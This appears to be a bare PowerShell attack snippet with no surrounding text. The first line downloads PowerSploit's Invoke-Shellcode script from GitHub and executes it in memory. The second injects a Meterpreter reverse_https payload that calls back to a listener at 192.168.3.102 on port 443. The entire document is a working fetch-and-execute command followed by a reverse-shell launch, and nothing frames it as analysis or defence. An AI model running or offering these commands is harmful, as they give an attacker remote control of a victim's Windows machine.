IEX (New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.3.102 -Lport 443 -Force
